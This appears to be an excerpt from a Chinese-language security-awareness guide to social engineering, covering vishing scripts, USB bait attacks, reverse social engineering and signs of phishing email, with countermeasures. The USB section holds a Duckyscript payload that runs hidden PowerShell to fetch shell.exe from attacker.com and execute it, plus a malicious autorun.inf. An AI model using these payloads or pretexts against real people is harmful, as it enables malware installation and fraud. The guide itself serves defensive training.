## 一、社会工程学概述

社会工程学利用**人性弱点**（信任、恐惧、好奇、贪婪）绕过技术防线。

**常见攻击向量：**
- 钓鱼邮件 / 钓鱼网站
- 电话诈骗（Vishing）
- USB 诱饵
- 假冒身份

## 三、电话社工（Vishing）

### 常见话术

```
"您好，我是 IT 部门的小张，您的工作站需要远程维护..."

"我是财务部的李总，现在有个紧急付款，需要你帮忙..."

"您好，微软技术支持，您的电脑检测到病毒，需要远程协助..."
```

### 防范措施

```
✅ 永远不要向来电者透露密码或验证码
✅ 主动回拨验证（使用官方渠道的号码）
✅ 重要操作必须走正式审批流程
✅ 对紧急请求保持怀疑态度
✅ 记录来电者信息并核实
```

## 四、USB 诱饵攻击

### BadUSB / USB 橡皮鸭

```bash
# USB Rubber Ducky（Duckyscript）
# 攻击脚本示例（自动打开 PowerShell 下载后门）

DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'http://attacker.com/shell.exe' -OutFile '$env:TEMP\update.exe'"
DELAY 2000
STRING $env:TEMP\update.exe
ENTER
```

### AutoRuns（自动运行攻击）

```bash
# 创建 autorun.inf
[autorun]
open=update.exe
icon=update.exe
label=USB Update

# 或植入快捷方式（LNK）指向恶意程序
```

### 防范

```
✅ 禁用 Autorun/AutoPlay
✅ 不自动执行未知 USB 设备
✅ 使用 USB 数据阻断器
✅ Endpoint Protection 检测异常行为
```

## 五、反向社会工程

### 攻击流程

```
1. 攻击准备
   → 收集目标公司信息，了解组织架构
   → 准备钓鱼物料（邮件、文档）

2. 引发问题
   → 制造一个"技术问题"（Dos/服务中断）
   → 让目标主动求助

3. 提供解决方案
   → 伪装成"IT 支持人员"联系目标
   → 目标主动寻求帮助，心理防线降低

4. 获取访问
   → 以"排查问题"为由获取凭据或系统访问
```


## 九、钓鱼邮件分析

### 快速判断方法

```
✅ 检查发件人域名（是否与声称的公司一致）
✅ 拼写和语法错误
✅ 紧迫感措辞（"立即"、"紧急"、"24小时内"）
✅ 可疑链接（悬停查看真实 URL）
✅ 附件类型（.exe、.js、.zip、.docm）
✅ 要求提供敏感信息
✅ 陌生发件人突然联系
```
